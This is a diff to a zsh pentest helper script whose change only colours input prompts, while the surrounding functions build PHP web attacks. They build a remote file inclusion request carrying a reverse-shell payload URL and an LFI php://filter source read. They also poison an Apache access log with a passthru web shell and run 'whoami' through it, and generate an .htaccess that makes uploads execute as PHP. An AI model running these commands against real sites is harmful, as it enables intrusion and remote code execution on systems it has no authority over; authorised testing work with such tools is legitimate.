@@ -23,7 +23,7 @@ qq-enum-web-php-rfi() {
     __warn "URL should contain /page.php?rfi="
     __warn "PAYLOAD URL should contain reverse php shell"
     qq-vars-set-url
-    local p && read "p?PAYLOAD URL: "
+    local p && read "p?$fg[cyan]PAYLOAD URL:$reset_color "
     print -z "curl -k -v -XGET \"${__URL}${p}%00\" "
 }
 
@@ -42,7 +42,7 @@ qq-enum-web-php-lfi-proc-self-environ() {
 qq-enum-web-php-lfi-filter-resource(){
     __warn "URL should contain /page.php?lfi="
     qq-vars-set-url
-    local f && read "f?RFILE: "
+    local f && read "f?$fg[cyan]RFILE:$reset_color "
     print -z "curl -k -v -XGET ${__URL}php://filter/convert.base64-encode/resource=${f} "
 }
 
@@ -63,14 +63,14 @@ qq-enum-web-php-lfi-zip-jpg-shell() {
 qq-enum-web-php-lfi-logfile() {
     __warn "URL should contain /page.php?lfi="
     qq-vars-set-url
-    local b && read "b?BASE URL: "
+    local b && read "b?$fg[cyan]BASE URL:$reset_color "
     curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
     __info "lfi request completed"
     print -z "curl -k -v ${__URL}../../../../../var/log/apache2/access.log&cmd=whoami"
 }
 
 qq-enum-web-php-gen-htaccess() {
-  local e && read "e?Extension: "
+  local e && read "e?$fg[cyan]Extension:$reset_color "
   __info "Upload .htaccess file to make alt extension executable by PHP"
   print -z "echo \"AddType application/x-httpd-php <extension>\" > htaccess"
 }
